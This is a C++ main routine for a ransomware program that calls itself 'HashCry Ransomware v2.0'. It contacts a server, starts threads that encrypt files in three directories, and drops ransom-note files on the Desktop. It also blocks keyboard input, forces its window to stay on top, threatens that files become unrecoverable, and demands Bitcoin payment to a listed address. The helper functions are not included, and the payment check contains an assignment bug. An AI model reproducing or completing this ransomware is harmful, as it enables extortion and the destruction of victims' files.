#include "debug.h"

auto main() -> int {
   
    if ( __DEBUG_MODE ) // debug info and stuff 
    {
        __debug();
    }
    __server_send();
     std::thread __encrypt_thread(aes_encrypt_files_thread); // -> encrypts __path_1
     std::thread __encrypt_thread_2(aes_encrypt_files_thread_2);  // -> encrypts __path_2
     std::thread __encrypt_thread_3(aes_encrypt_files_thread_3);  // -> encrypts __path_3
     __read_me_file("\\Desktop\\READ_ME0.README");
     __read_me_file("\\Desktop\\READ_ME1.README");
     __read_me_file("\\Desktop\\READ_ME2.README");
     __read_me_file("\\Desktop\\READ_ME3.README");
    system("color b");
    SetConsoleTitleA("HashCry Ransomware v2.0 | All Your Files Have Been Encrpyted | F7000425AF37DC6BD3829835B6265DC6E4FDD67E41");
    BlockInput(1);

    std::thread renderThread(RenderUIThread); Sleep(6000);
    HWND consoleWindow = GetConsoleWindow();
    SetWindowPos(consoleWindow, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);

    BlockInput(0);
    std::cout << "\n As you can tell, all your files have been encrypted. We use AES-256 military-grade encryption!";
    std::cout << "\n Closing this program WILL MAKE YOUR FILES UNRECOUVERABLE!";

    std::cout << (("\n [ $ ] -> Pay 40 USD in BTC to 1MrpVvv9YcS7Y9jb5wkw3e3UN3Gad5XwVn to decrpyt your shit!\n"));
    bool ud = is_payed();

    if (ud = true)
    {
        std::cout << (("\n [ # ] -> Decrypting... \n"));
        aes_decrypt_files(__path);
        aes_decrypt_files(__path_2);
        aes_decrypt_files(__path_3);

        std::cout << (("\n [ # ] -> Done! \n"));
        Sleep(3000);
        exit(1);
    }
    return 0;
}
